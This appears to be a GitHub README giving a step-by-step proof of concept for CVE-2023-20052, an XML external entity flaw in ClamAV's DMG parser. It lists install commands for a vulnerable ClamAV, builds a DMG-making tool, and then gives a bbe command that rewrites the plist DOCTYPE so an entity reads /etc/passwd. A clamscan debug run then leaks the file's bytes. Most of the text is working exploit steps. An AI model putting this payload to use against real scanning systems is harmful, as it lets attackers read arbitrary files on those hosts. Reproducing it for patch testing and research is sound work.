# CVE-2023-20052 <br>
CVE-2023-20052 information leak vulnerability in the DMG file parser of ClamAV <br>
A vulnerability in the DMG file parser of ClamAV versions 1.0.0 and earlier, 0.105.1 and earlier, and 0.103.7 and earlier could allow an unauthenticated, remote attacker to access sensitive information on an affected device. This vulnerability is due to enabling XML entity substitution that may result in XML external entity injection. An attacker could exploit this vulnerability by submitting a crafted DMG file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to leak bytes from any file that may be read by the ClamAV scanning process. <br>
 <br>
## Tested in Ubuntu 20.04 
## How to install ClamAV version 1.0.0 <br>
* https://github.com/Cisco-Talos/clamav/releases/download/clamav-1.0.0/clamav-1.0.0.linux.i686.deb <br>
* https://github.com/Cisco-Talos/clamav/releases/download/clamav-1.0.0/clamav-1.0.0.linux.x86_64.deb <br>
<br>

sudo dpkg -i package-name.deb <br>
![1](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/6372f693-b4fd-4b88-869b-fa48b550b840)

* sudo apt install -f <br>
* mkdir /usr/local/share/clamav <br>
* mv /usr/local/etc/freshclam.conf.sample /usr/local/etc/freshclam.conf <br>
![2](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/14e7c7e7-9260-45fb-b1bd-bd7545d77730)


* sudo adduser clamav <br>
![3](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/d77b6c58-714f-4676-8776-860d7b9dd95f)


* sudo chown -R 1002:1003 /usr/local/share/clamav <br>
* sudo freshclam <br>
![4](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/c3b327ce-189f-43a9-bea3-ebeee95e5995)

![5](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/2f17ed8e-e968-4d21-aedb-c6b42f93e5f1)


* clamscan --version <br>
![6](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/e22478aa-a7a0-46d8-8917-6ddcefa75b7a)


## Installing a few more things required for this exploit. <br>
* apt-get update
* apt-get install -y ca-certificates gnupg wget <br>
* echo "deb http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list <br>
* wget -q -O - https://ftp-master.debian.org/keys/archive-key-9-security.asc | apt-key add - <br>
* apt-get update -y <br>
* sudo apt install -y libssl1.0-dev gcc g++ cmake zlib1g-dev genisoimage bbe git hfsplus <br>
![7](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/d101f89d-8ef5-483d-b18c-501d355ff4e6)


* git clone https://github.com/planetbeing/libdmg-hfsplus.git <br>
![8](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/8a41e9a3-754e-4c3a-a998-1737494acfe2)

* cd /libdmg-hfsplus <br>
* cmake . <br>
![9](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/39e42016-5bbe-41e6-98b7-80d5e3e3e0a3)

* make <br>
![10](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/0cbb4282-16f8-4917-ac2c-9d4bb9514d00)

* cp dmg/dmg /bin <br>
``sudo genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg`` <br>
![11](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/c95eae54-0c1c-4239-889e-2cfae988a5f1)

``bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit2.dmg``
 ![12](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/f99d9659-22cc-4cb4-9517-783863bd3300)

* clamscan --debug exploit2.dmg
![13](https://github.com/cY83rR0H1t/CVE-2023-20052/assets/48300212/27194b56-285c-43d1-bc88-ff8e14bfd6ba)


Reference: https://github.com/nokn0wthing/CVE-2023-20052
